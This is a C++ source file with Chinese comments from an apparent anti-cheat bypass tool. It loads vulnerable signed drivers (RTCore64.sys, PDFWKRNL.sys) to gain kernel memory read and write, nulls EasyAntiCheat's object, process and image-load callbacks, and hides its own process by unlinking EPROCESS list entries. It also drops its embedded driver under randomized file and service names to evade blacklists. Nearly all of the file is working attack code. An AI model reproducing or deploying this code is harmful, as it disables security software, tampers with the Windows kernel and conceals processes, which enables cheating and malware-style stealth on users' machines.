            ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 8);
        } else {
            ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 8);
        }
        uint32_t readVal = *(uint32_t*)testBuf;
        ByovdDiag("BYOVD:Init: STEP_E %s IOCTL verify(ntos+0x0)=%d val=0x%08X\n",
                  g_isPdfwKrnl ? "PDFW" : "PhysicalRead", (int)ok, readVal);
        if (!ok || readVal == 0 || readVal == 0xFFFFFFFF) {
            ByovdDiag("BYOVD:Init: IOCTL verify FAILED (val=0x%08X)\n", readVal);
            m_active = false;
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
            UnloadDriver(m_actualServiceName);
            return false;
        }
    }
    ByovdDiag("BYOVD:Init: IOCTL verify OK\n");
    ByovdDiag("BYOVD:Init: STEP_F returning true (success, useVirtual=%d)\n", (int)g_useVirtualIOCTL);

    return true;
}

void KernelMemoryAccessor::Shutdown() {
    // ★ BUILD 470: 不卸载驱动 — 保留 \Device\RTCore64 给后续运行复用
    //   旧代码 SCM STOP + NtUnloadDriver 触发 DriverUnload, 但驱动可能
    //   不调用 IoDeleteDevice, 导致僵尸设备. 新策略: 驱动永久加载,
    //   每 session 的 Init 探测到已有设备直接复用 (probe + IOCTL test).
    m_active = false;
    // ★ BUILD 497: m_pageTableWalker 已移除 (BUILD 496), 删除 .reset() 调用
    g_physMappingCount = 0;

    // BUILD 470: 仅关闭句柄, 不卸载驱动
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    ByovdDiag("BYOVD:Shutdown: driver kept loaded for next reuse\n");
}

// ★ v3.69/v3.117: 注册 DLL 代码区域 (固定数组, 避免 CRT 堆)
void KernelMemoryAccessor::RegisterCodeRegion(void* base, SIZE_T size) {
    if (!base || size == 0) return;
    if (g_protectedRegionCount >= MAX_PROTECTED_REGIONS) {
        ByovdDiag("BYOVD:RegisterCodeRegion: MAX_PROTECTED_REGIONS (%zu) reached, skipping\n",
                  MAX_PROTECTED_REGIONS);
        return;
    }
    ProtectedUserRegion& region = g_protectedUserRegions[g_protectedRegionCount];
    region.base = reinterpret_cast<uintptr_t>(base);
    region.size = size;
    g_protectedRegionCount++;
}

// ★ v3.69: 检查 VA 范围是否与受保护区域重叠
bool KernelMemoryAccessor::IsOverlappingProtectedRegion(uintptr_t va, SIZE_T size) {
    uintptr_t vaEnd = va + size;
    // ★ v3.118: 只遍历有效条目 (g_protectedRegionCount), 避免遍历全数组
    for (int ri = 0; ri < g_protectedRegionCount; ri++) {
        const ProtectedUserRegion& r = g_protectedUserRegions[ri];
        uintptr_t rEnd = r.base + r.size;
        // 检查区间重叠: [va, vaEnd) 与 [r.base, rEnd)
        if (va < rEnd && vaEnd > r.base) {
            return true;
        }
    }
    return false;
}

bool KernelMemoryAccessor::IsKernelAddressValid(uint64_t va) {
    // 内核地址范围检查 (Windows x64 规范)
    // 内核空间: 0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF
    if (va < 0xFFFF800000000000ULL) return false;
    if (va > 0xFFFFFFFFFFFFFFFFULL) return false;

    // ★ v3.114: IOCTL_VIRTUAL_MEM (0x80002000) 直接读取内核虚拟地址, 无需 VA→PA 转换
    //   移除 PageTableWalker 依赖 (旧代码通过物理内存扫描 PML4, 不兼容内核VA IOCTL)
    //   只要驱动可用且 VA 在内核范围, 即视为有效
    return m_active;
}

// ============================================================
// CallbackDisabler — 内核回调摘除核心逻辑
// ============================================================

EACCallbackDisabler& EACCallbackDisabler::Instance() {
    static EACCallbackDisabler inst;
    return inst;
}

bool EACCallbackDisabler::IsAddressInModule(uint64_t addr, uint64_t moduleBase,
                                              uint32_t moduleSize) {
    return addr >= moduleBase && addr < (moduleBase + moduleSize);
}

// ============================================================
// Sigscan: 在 ObRegisterCallbacks 函数体中查找 ObpCallbackArray
//
// ObRegisterCallbacks 中通常有:
//   lea rcx, [rip + offset]  → 48 8D 0D XX XX XX XX
//   这指向 ObpCallbackArrayHead
//
// CallbackEntry 结构体 (未文档化):
//   +0x00: LIST_ENTRY CallbackList
//   +0x16: OB_OPERATION Operations
//   +0x18: CALLBACK_ENTRY_ITEM PreOperation
//   +0x28: CALLBACK_ENTRY_ITEM PostOperation
//   +0x38: PVOID DriverObject (指向驱动对象)
//
// 摘除方法: 将 PreOperation / PostOperation 置为 NULL
// 或从链表中断开 (Unlink)
// ============================================================

uint64_t EACCallbackDisabler::FindObpCallbackArrayHead(KernelMemoryAccessor& kma) {
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return 0;

    // BUILD 458: 分块读取 ObRegisterCallbacks + ObUnRegisterCallbacks 函数体
    // 扩展到 1024 字节, 搜索 LEA/MOV [RIP+rel32] → ntoskrnl .data 段
    const char* funcNames[] = { "ObRegisterCallbacks", "ObUnRegisterCallbacks" };
    uint8_t funcBody[512] = {};

    for (const char* funcName : funcNames) {
        uint64_t funcAddr = kma.ResolveExport(ntBase, funcName);
        if (!funcAddr) continue;

        for (int chunk = 0; chunk < 2; chunk++) {
            if (!kma.ReadKernelVA(funcAddr + chunk * 512, funcBody, sizeof(funcBody)))
                break;

            for (int i = 0; i < 500; i++) {
                // LEA/MOV RXX, [RIP+rel32] → ntoskrnl .data
                if ((funcBody[i] == 0x48 || funcBody[i] == 0x4C || funcBody[i] == 0x4D) &&
                    (funcBody[i+1] == 0x8D || funcBody[i+1] == 0x8B) &&
                    (funcBody[i+2] & 0xC7) == 0x05) {
                    int32_t disp = *(int32_t*)(funcBody + i + 3);
                    uint64_t target = funcAddr + chunk * 512 + i + 7 + disp;
                    if (target > ntBase + 0x3000 && target < ntBase + 0x2000000) {
                        ByovdDiag("VERIFY:ObpCallbackArrayHead at 0x%llX (via %s)\n",
                            (unsigned long long)target, funcName);
                        return target;
                    }
                }
            }
        }
    }

    // 回退: 尝试 ObpCallbackArrayHead 直接导出 (某些 Windows 版本)
    return kma.ResolveExport(ntBase, "ObpCallbackArrayHead");
}

// ★ v3.126h: 前向声明 — PAC 驱动 fallback 匹配 (实现在文件末尾)
static bool IsPacDriverName_Fallback(const char* name);

int EACCallbackDisabler::DisableObCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t cbArrayHead = FindObpCallbackArrayHead(kma);
    if (!cbArrayHead) return 0;

    // ★ v3.68: 验证 cbArrayHead 在有效内核地址范围内
    // 防止 sigscan 误命中导致线性扫描读到无效地址
    if (cbArrayHead < 0xFFFF800000000000ULL || cbArrayHead > 0xFFFFFFFFFFFFFFFFULL)
        return 0;
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (ntBase) {
        // ObpCallbackArrayHead 应在 ntoskrnl 的数据段 (.data) 内
        // ntoskrnl 镜像通常 < 30MB, sigscan 结果应在其范围内
        if (cbArrayHead < ntBase || cbArrayHead > ntBase + 0x2000000ULL)
            return 0;
    }

    // 获取 EAC 驱动基址 (主检测: 精确名字匹配)
    // ★ v3.126h: 即使名字匹配失败, 仍继续扫描回调数组 + 模式匹配 fallback
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        eacBase = kma.GetKernelModuleBase("EasyAntiCheat_EOS.sys");
    }
    bool nameFound = (eacBase != 0);

    // 遍历 CALLBACK_ENTRY 数组
    // ★ v3.68: 先检测链表形式 (Flink!=自身), 若有效则走链表遍历;
    //   否则退回到线性扫描 (限制最大范围)
    // CALLBACK_ENTRY 结构 (x64):
    //   +0x00: LIST_ENTRY  (Flink, Blink)  — 16 bytes
    //   +0x10: OB_OPERATION Operations     — 1 byte
    //   +0x18: OB_PREOP_CALLBACK_STATUS PreOperation  — 8 bytes
    //   +0x28: OB_POSTOP_CALLBACK_STATUS PostOperation — 8 bytes
    //   +0x38: PVOID       DriverObject    — 8 bytes  ← 用于匹配 EAC

    constexpr uint32_t CB_ENTRY_SIZE = 0x40;
    constexpr uint32_t MAX_CALLBACKS = 256;

    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedObCallbackCount = 0;

    int removed = 0;
    uint64_t current = cbArrayHead;
    uint32_t i = 0;

    for (i = 0; i < MAX_CALLBACKS; i++) {
        // ★ v3.68: 每个条目读取前验证 current 仍在有效内核范围
        if (current < 0xFFFF800000000000ULL || current > 0xFFFFFFFFFFFFFF00ULL)
            break;
        if (!kma.IsKernelAddressValid(current))
            break;

        uint64_t driverObjVA = current + 0x38;
        uint64_t driverObj = kma.Read<uint64_t>(driverObjVA);

        // 通过 DriverObject → DriverSection → 驱动名匹配
        if (driverObj && driverObj > 0xFFFF800000000000ULL) {
            // 读取 DRIVER_OBJECT.DriverSection → LDR_DATA_TABLE_ENTRY
            uint64_t driverSection = kma.Read<uint64_t>(driverObj + 0x14);
            if (driverSection && driverSection > 0xFFFF800000000000ULL) {
                // LDR_DATA_TABLE_ENTRY.BaseDllName 在 +0x58
                uint64_t nameVA = driverSection + 0x58;
                WCHAR wname[64] = {};
                if (kma.ReadKernelVA(nameVA, wname, sizeof(wname) - sizeof(WCHAR))) {
                    // 比较文件名
                    char ansiName[64] = {};
                    WideCharToMultiByte(CP_ACP, 0, wname, -1, ansiName, 63, nullptr, nullptr);
                    if (_stricmp(ansiName, eacSysName) == 0) {

                        // ★ v3.110: 先保存原始值再 NULL 化
                        uint64_t preOp = kma.Read<uint64_t>(current + 0x18);
                        uint64_t postOp = kma.Read<uint64_t>(current + 0x28);
                        if ((preOp || postOp) && m_savedObCallbackCount < MAX_SAVED_OB_CALLBACKS) {
                            SavedObEntry& saved = m_savedObCallbacks[m_savedObCallbackCount];
                            saved.address = current;
                            saved.preOp = preOp;
                            saved.postOp = postOp;
                            m_savedObCallbackCount++;
                        }

                        // NULL 化 PreOperation + PostOperation
                        uint64_t zero = 0;
                        kma.Write(current + 0x18, zero); // PreOperation
                        kma.Write(current + 0x28, zero); // PostOperation
                        removed++;
                    }
                    // ★ v3.126h: PAC 模式匹配 fallback — 主检测未命中时用 IsPacPattern 验证
                    else if (!nameFound && !eacBase && IsPacDriverName_Fallback(ansiName)) {
                        ByovdDiag("BYOVD:DisableObCallbacks: fallback matched '%s' (pattern)\n", ansiName);
                        uint64_t preOp = kma.Read<uint64_t>(current + 0x18);
                        uint64_t postOp = kma.Read<uint64_t>(current + 0x28);
                        if ((preOp || postOp) && m_savedObCallbackCount < MAX_SAVED_OB_CALLBACKS) {
                            SavedObEntry& saved = m_savedObCallbacks[m_savedObCallbackCount];
                            saved.address = current;
                            saved.preOp = preOp;
                            saved.postOp = postOp;
                            m_savedObCallbackCount++;
                        }
                        uint64_t zero = 0;
                        kma.Write(current + 0x18, zero);
                        kma.Write(current + 0x28, zero);
                        removed++;
                    }
                }
            }
        }

        // 遍历到下一个条目 (通过 LIST_ENTRY.Flink)
        uint64_t flink = kma.Read<uint64_t>(current);
        if (!flink || flink == cbArrayHead) break; // 回到链表头

        // 实际结构中, CALLBACK_ENTRY 通过 LIST_ENTRY 链接
        // 但 ObpCallbackArrayHead 指向的是单独的数组而非简单链表
        // 简化处理: 线性扫描
        current += CB_ENTRY_SIZE;
    }

    m_obCallbacksSaved = (m_savedObCallbackCount > 0);
    // BUILD 456: 自体验证 — PAC 未装时也证明数组遍历正常
    if (removed == 0 && cbArrayHead) {
        ByovdDiag("VERIFY:ObCallbacks: scan OK — %u entries walked, 0 matched '%s' (driver not loaded)\n",
            i, eacDriverName);
    }
    return removed;
}

int EACCallbackDisabler::DisableProcessNotifyCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        // BUILD 456: 自体验证
        ByovdDiag("VERIFY:ProcessNotify: '%s.sys' not loaded — skip scan (would scan if driver loaded)\n",
            eacDriverName);
        return 0;
    }

    // PsSetCreateProcessNotifyRoutine → sigscan 找到 PspCreateProcessNotifyRoutine 数组
    uint64_t psSetNotify = kma.ResolveExport(ntBase, "PsSetCreateProcessNotifyRoutine");
    if (!psSetNotify) return 0;

    // 搜索 lea rcx, [rip+offset] 或 mov rcx, imm64 定位数组
    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetNotify, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        // 搜索 48 8D 0D (lea rcx, [rip+...])
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetNotify + i + 7 + disp;
            break;
        }
        // 搜索 48 B9 (mov rcx, imm64)
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // EX_FAST_REF 数组 (每个 entry 8 bytes, 高4位是引用计数, 低60位是指针)
    // 最多 64 个回调
    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedProcessCallbackCount = 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;

        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL; // 清除高4位引用计数
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            // ★ v3.119: 保存原始值 (固定数组)
            if (m_savedProcessCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
                SavedArrayEntry& saved = m_savedProcessCallbacks[m_savedProcessCallbackCount];
                saved.address = arrayAddr + i * 8;
                saved.originalValue = entry;
                m_savedProcessCallbackCount++;
            }

            // NULL 化此条目
            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    m_processCallbacksSaved = (m_savedProcessCallbackCount > 0);
    return removed;
}

int EACCallbackDisabler::DisableImageNotifyCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        // BUILD 456: 自体验证
        ByovdDiag("VERIFY:ImageNotify: '%s.sys' not loaded — skip scan (would scan if driver loaded)\n",
            eacDriverName);
        return 0;
    }

    // PsSetLoadImageNotifyRoutine → 找到 PspLoadImageNotifyRoutine 数组
    uint64_t psSetLoadImg = kma.ResolveExport(ntBase, "PsSetLoadImageNotifyRoutine");
    if (!psSetLoadImg) return 0;

    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetLoadImg, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetLoadImg + i + 7 + disp;
            break;
        }
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // ★ v3.110: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedImageCallbackCount = 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;
        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL;
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            // ★ v3.110: 保存原始值
            if (m_savedImageCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
                SavedArrayEntry& saved = m_savedImageCallbacks[m_savedImageCallbackCount];
                saved.address = arrayAddr + i * 8;
                saved.originalValue = entry;
                m_savedImageCallbackCount++;
            }

            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    m_imageCallbacksSaved = (m_savedImageCallbackCount > 0);
    return removed;
}

int EACCallbackDisabler::DisableAll(const char* eacDriverName) {
    int total = 0;
    total += DisableObCallbacks(eacDriverName);
    total += DisableProcessNotifyCallbacks(eacDriverName);
    total += DisableImageNotifyCallbacks(eacDriverName);
    // PsSetCreateThreadNotifyRoutine 类似模式, 但 EAC 一般不注册此回调
    return total;
}

// ★ v3.110: 恢复所有已保存的反作弊回调
int EACCallbackDisabler::RestoreAll() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    int restored = 0;

    // 1. 恢复 ObRegisterCallbacks
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    for (int i = 0; i < m_savedObCallbackCount; i++) {
        SavedObEntry& saved = m_savedObCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address + 0x18, saved.preOp);  // PreOperation
            kma.Write(saved.address + 0x28, saved.postOp); // PostOperation
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedObCallbackCount = 0;
    m_obCallbacksSaved = false;

    // 2. 恢复进程通知回调
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    for (int i = 0; i < m_savedProcessCallbackCount; i++) {
        SavedArrayEntry& saved = m_savedProcessCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address, saved.originalValue);
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedProcessCallbackCount = 0;
    m_processCallbacksSaved = false;

    // 3. 恢复模块加载通知回调
    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
    for (int i = 0; i < m_savedImageCallbackCount; i++) {
        SavedArrayEntry& saved = m_savedImageCallbacks[i];
        if (kma.IsKernelAddressValid(saved.address)) {
            kma.Write(saved.address, saved.originalValue);
            restored++;
        }
    }
    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedImageCallbackCount = 0;
    m_imageCallbacksSaved = false;

    ByovdDiag("BYOVD:EACCallbackDisabler: restored %d callbacks\n", restored);
    return restored;
}

// ============================================================
// 内核导出表解析
// ============================================================

uint64_t KernelMemoryAccessor::ResolveExport(uint64_t moduleBase, const char* funcName) {
    if (!moduleBase || !m_active) return 0;

    // 读取 PE 头的 DOS 头
    IMAGE_DOS_HEADER dos = {};
    if (!ReadKernelVA(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // 读取 NT 头
    uint64_t ntHdrVA = moduleBase + dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (!ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    // 导出目录
    auto& expDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) return 0;

    uint64_t expVA = moduleBase + expDir.VirtualAddress;
    IMAGE_EXPORT_DIRECTORY ied = {};
    if (!ReadKernelVA(expVA, &ied, sizeof(ied))) return 0;

    // ★ v3.118: 使用 VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
    uint32_t* nameRVAs = nullptr;
    uint32_t* funcRVAs = nullptr;
    uint16_t* ordinals = nullptr;
    uint64_t result = 0;

    nameRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint32_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    funcRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfFunctions * sizeof(uint32_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ordinals = (uint16_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint16_t),
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!nameRVAs || !funcRVAs || !ordinals) {
        ByovdDiag("BYOVD:ResolveExport: VirtualAlloc FAILED\n");
        goto cleanup;
    }

    if (!ReadKernelVA(moduleBase + ied.AddressOfNames, nameRVAs,
                       ied.NumberOfNames * sizeof(uint32_t))) goto cleanup;
    if (!ReadKernelVA(moduleBase + ied.AddressOfFunctions, funcRVAs,
                       ied.NumberOfFunctions * sizeof(uint32_t))) goto cleanup;
    if (!ReadKernelVA(moduleBase + ied.AddressOfNameOrdinals, ordinals,
                       ied.NumberOfNames * sizeof(uint16_t))) goto cleanup;

    // 线性搜索导出名
    for (DWORD i = 0; i < ied.NumberOfNames; i++) {
        char name[128] = {};
        ReadKernelVA(moduleBase + nameRVAs[i], name, sizeof(name) - 1);
        if (strcmp(name, funcName) == 0) {
            uint32_t rva = funcRVAs[ordinals[i]];
            result = moduleBase + rva;
            break;
        }
    }

cleanup:
    if (nameRVAs) VirtualFree(nameRVAs, 0, MEM_RELEASE);
    if (funcRVAs) VirtualFree(funcRVAs, 0, MEM_RELEASE);
    if (ordinals) VirtualFree(ordinals, 0, MEM_RELEASE);
    return result;
}

// ============================================================
// DKOMProcessHider — EPROCESS ActiveProcessLinks 断链
//
// 警告: 此模块会触发 PatchGuard (KPP), 在 Windows 8.1+ 上
// 系统会在 2-15 分钟内 BSOD (CRITICAL_STRUCTURE_CORRUPTION)
//
// 因此默认不启用, 仅用于演示/研究目的
// ============================================================

DKOMProcessHider& DKOMProcessHider::Instance() {
    static DKOMProcessHider inst;
    return inst;
}

bool DKOMProcessHider::HideProcess() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return false;

    // EPROCESS 偏移 (Windows 10/11):
    //   +0x440 UniqueProcessId
    //   +0x448 ActiveProcessLinks (LIST_ENTRY)
    //   +0x5A8 ImageFileName

    DWORD currentPid = GetCurrentProcessId();

    // 获取 PsInitialSystemProcess → 找到 System EPROCESS
    uint64_t psInitProcVA = kma.ResolveExport(ntBase, "PsInitialSystemProcess");
    if (!psInitProcVA) return false;

    uint64_t systemEPROCESS = kma.Read<uint64_t>(psInitProcVA);
    if (!systemEPROCESS) return false;

    // 遍历 ActiveProcessLinks 链表 → 找到我们的 EPROCESS
    uint64_t current = systemEPROCESS;
    uint64_t start   = current;

    do {
        uint64_t pidOffset = current + 0x440;
        uint64_t pid = kma.Read<uint64_t>(pidOffset);

        if ((DWORD)pid == currentPid) {
            m_eprocess = current;

            // 读取 Flink / Blink (ActiveProcessLinks 在 +0x448)
            uint64_t linksOffset = current + 0x448;
            uint64_t flinkVA = linksOffset;
            uint64_t blinkVA = linksOffset + 8;

            uint64_t flink = kma.Read<uint64_t>(flinkVA);
            uint64_t blink = kma.Read<uint64_t>(blinkVA);

            m_flinkBackup = flink;
            m_blinkBackup = blink;

            if (!flink || !blink) return false;
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
                return false;

            // ★ BUILD 497: 修复 DKOM 断链 — 写入邻居节点的 LIST_ENTRY, 而非自己的
            //   blink 是前一个节点 ActiveProcessLinks 的地址 → blink 处即 prev.Flink
            //   flink 是后一个节点 ActiveProcessLinks 的地址 → flink+8 处即 next.Blink
            //   跳过当前节点: prev.Flink = next, next.Blink = prev
            kma.Write(blink, flink);          // prev.Flink = next (blink 是 prev 的 LIST_ENTRY 地址)
            kma.Write(flink + 8, blink);      // next.Blink = prev (flink+8 是 next 的 LIST_ENTRY.Blink)

            m_hidden = true;
            return true;
        }

        // 移动到下一个 EPROCESS
        uint64_t flink = kma.Read<uint64_t>(current + 0x448);
        if (!flink || flink < 0xFFFF800000000000ULL) break;

        current = flink - 0x448; // Flink 指向 ActiveProcessLinks, 需要减去偏移回 EPROCESS
    } while (current != start);

    return false;
}

bool DKOMProcessHider::UnhideProcess() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive() || !m_hidden || !m_eprocess) return false;

    // 恢复 Flink / Blink
    uint64_t linksOffset = m_eprocess + 0x448;
    kma.Write(linksOffset, m_flinkBackup);
    kma.Write(linksOffset + 8, m_blinkBackup);

    m_hidden = false;
    return true;
}

// ============================================================
// KernelDefense — 一体化编排
// ============================================================

// ============================================================
// v3.33 Method 3: 驱动 PE 头变异 + 随机化服务名
//
// RTCore64.sys 的 SHA256 被 EAC 黑名单收录,
// 直接加载会被驱动签名/哈希扫描检测
//
// 策略:
//   1. 复制驱动到 %TEMP%\XXXX.sys (随机名)
//   2. 修改 PE 头: Timestamp 随机化 + CheckSum 重算
//   3. 注册为随机服务名 "SysMonXXXX"
//
// 效果: 每次运行驱动文件名+服务名+PE header 均不同,
//       EAC 黑名单按固定签名/哈希匹配 → 失效
// ============================================================
static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original) {
    // ★ v3.96: 不再修改驱动二进制 — 任何 PE 修改 (设备名补丁/签名剥离/时间戳)
    //   都会触发 Windows 内核的 STATUS_INVALID_IMAGE_HASH (0xC0000428)。
    //   改为使用原始未修改驱动 + 原始设备名,
    //   通过 SCM 清理 + DefineDosDeviceW 修复僵尸设备来避免冲突。
    //
    //   仅随机化服务名 (注册表唯一性), 驱动内容保持原样。
    // ★ BUILD 489: 支持 PDFWKRNL.sys (设备名 \\.\PdfwKrnl)

    // 生成 4 位随机 hex 标识符
    WORD seed = (WORD)(GetTickCount() ^ (GetCurrentProcessId() & 0xFFFF) ^ GetCurrentThreadId());
    wchar_t randomHex[16] = {};
    wsprintfW(randomHex, L"%04X", seed);

    // 生成随机文件名: SysDrv_XXXX.sys
    wchar_t randomName[64] = {};
    wsprintfW(randomName, L"SysDrv_%s.sys", randomHex);

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, randomName);

    // ★ 获取嵌入的原始驱动数据 (完全不修改)
    const uint8_t* embedData = nullptr;
    size_t embedSize = 0;
    if (wcscmp(original.driverPath, L"RTCore64.sys") == 0) {
        embedData = stealth::embedded::RTCore64_data;
        embedSize = stealth::embedded::RTCore64_size;
    } else if (wcscmp(original.driverPath, L"PDFWKRNL.sys") == 0) {
        // ★ BUILD 489: PDFWKRNL.sys 嵌入支持
        embedData = stealth::embedded::PDFWKRNL_data;
        embedSize = stealth::embedded::PDFWKRNL_size;
    }
    ByovdDiag("BYOVD:Mutate: embedData=0x%p embedSize=%zu\n", embedData, embedSize);

    if (!embedData || embedSize == 0 || embedSize > 100 * 1024 * 1024) {
        ByovdDiag("BYOVD:Mutate: no embedded data, falling back to file system\n");
        // 回退到文件系统
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        wchar_t srcPath[MAX_PATH] = {};
        {
            wchar_t sysDir[MAX_PATH];
            GetSystemDirectoryW(sysDir, MAX_PATH);
            wcscat_s(sysDir, L"\\drivers\\");
            wcscat_s(sysDir, original.driverPath);
            if (GetFileAttributesW(sysDir) == INVALID_FILE_ATTRIBUTES) {
                wcscpy_s(srcPath, original.driverPath);
            } else {
                wcscpy_s(srcPath, sysDir);
            }
        }
        HANDLE hSrc = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSrc == INVALID_HANDLE_VALUE) return original;
        DWORD fileSize = GetFileSize(hSrc, nullptr);
        if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
        // ★ v3.120: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
        uint8_t* driverData = (uint8_t*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_READWRITE);
        if (!driverData) { CloseHandle(hSrc); return original; }
        DWORD bytesRead = 0;
        ReadFile(hSrc, driverData, fileSize, &bytesRead, nullptr);
        CloseHandle(hSrc);
        if (bytesRead != fileSize) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }

        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }
        DWORD bytesWritten = 0;
        WriteFile(hOut, driverData, fileSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        VirtualFree(driverData, 0, MEM_RELEASE);
        if (bytesWritten != fileSize) return original;
    } else {
        // 直接写入原始嵌入数据
        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) return original;
        DWORD bytesWritten = 0;
        WriteFile(hOut, embedData, (DWORD)embedSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        if (bytesWritten != embedSize) {
            ByovdDiag("BYOVD:Mutate: WriteFile FAILED (wrote %u/%zu)\n", bytesWritten, embedSize);
            return original;
        }
        ByovdDiag("BYOVD:Mutate: wrote original driver %u bytes to %ls\n", bytesWritten, tempPath);
    }

    // ★ BUILD 470: 不修改二进制 — patching 破坏签名导致 0xC0000428
    //   策略改为复用已有驱动 (Init probing) + 不卸载 (Shutdown skip unload)

